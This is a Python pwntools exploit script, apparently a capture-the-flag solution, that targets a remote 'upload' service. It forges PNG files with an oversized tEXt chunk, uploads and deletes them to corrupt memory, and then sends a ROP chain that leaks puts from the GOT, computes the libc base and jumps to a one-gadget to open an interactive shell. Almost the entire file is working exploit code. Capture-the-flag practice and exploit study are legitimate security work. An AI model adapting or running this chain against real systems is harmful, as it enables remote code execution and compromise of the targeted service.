#!/usr/bin/env python

from pwn import *

#!/usr/bin/env python

import sys, struct, binascii
import zlib

def header(bytes): 
    return struct.unpack('>NNccccc', bytes)

def parse(bytes): 
    signature = bytes[:8]
    bytes = bytes[8:]

    while bytes: 
        length = struct.unpack('>I', bytes[:4])[0]
        bytes = bytes[4:]

        chunk_type = bytes[:4]
        bytes = bytes[4:]

        chunk_data = bytes[:length]
        bytes = bytes[length:]

        crc = struct.unpack('>I', bytes[:4])[0]
        bytes = bytes[4:]

        #      print length, chunk_type, len(chunk_data), repr(crc)
        yield chunk_type, chunk_data

def chunk(chunk_type, chunk_data): 
    length = struct.pack('>I', len(chunk_data))
    c = binascii.crc32(chunk_type + chunk_data) & 0xffffffff
    crc = struct.pack('>I', c)
    print len(chunk_data), chunk_type, len(chunk_data), c
    return length + chunk_type + chunk_data + crc

def gen(qq, is_big=False): 
    #name = sys.argv[1]
    if is_big:
        with open("temp.png", 'rb') as f: 
            bytes = f.read()
    else:
        with open("small.png", 'rb') as f: 
            bytes = f.read()
    s = ''
    s += bytes[:8]
    for a, b in parse(bytes):
        s += (chunk( a , b))
        if a == "IEND":
            s += (chunk("tEXt", qq))
    return s

global r

def upload(tmp, recv=True):
    s = zlib.compress(tmp)
    if recv:
        r.recvuntil('6 :) Monitor File\n')
    r.sendline('2')
    r.send(p32(len(s)))
    r.send(s)

def delete(n):
    r.recvuntil('6 :) Monitor File\n')
    r.sendline('4')
    r.recvuntil('?\n')
    r.sendline(str(n))

if __name__ == '__main__': 
    global r
    #r = process('./upload')
    r = remote('202.120.7.216', 12345)
    ori = gen("a" * (0x100000-0x169+0x2000), True)
    upload(ori)
    delete(0)
    r.recvuntil('6 :) Monitor File\n')
    r.sendline('6')
    cond = 0x60e1a0
    mutex = 0x000000000060E160
    puts_got = 0x000000000060e028
    puts = 0x400af0
    pop_rdi = 0x00000000004038b1
    pop_rsi_r15 = 0x00000000004038af
    pop_rbp = 0x0000000000400cc0
    leave = 0x0000000000400d9d
    read = 0x0000000000400F14
    buf = 0x0060f000-0x180

    s = 'b'*0xda3

    s += p64(cond) + p64(mutex)
    s += 'a'*16
    s += p64(pop_rdi) + p64(puts_got) + p64(puts)
    s += p64(pop_rdi) + p64(buf) + p64(pop_rsi_r15) + p64(9) + p64(0) + p64(read)
    s += p64(pop_rbp) + p64(buf-8) + p64(leave)
    upload(gen(s))
    r.recvuntil('Monitor File\n')
    s = r.recvuntil('\n', drop=True)
    leak = u64(s.ljust(8, '\x00'))
    
    puts_off = 0x000000000006b990
    #puts_off = 0x000000000006fd60

    libc_base = leak - puts_off
    system = 0x0000000000041490 + libc_base
    sh = 0x1633e8+ libc_base
    print hex(libc_base)
    #s = p64(pop_rdi) + p64(sh) + p64(system)*2 + p64(sh)
    s = p64(libc_base + 0x41374)
    r.sendline('')
    tmp = r.recvuntil('Monitor File\n')
    r.sendline(s)
    tmp = r.recvuntil('Monitor File\n', timeout=1)
    '''
    while tmp:
        r.sendline(s)
        tmp = r.recvuntil('Monitor File\n', timeout=1)
        print tmp
        time.sleep(0.5)
    '''

    r.interactive()


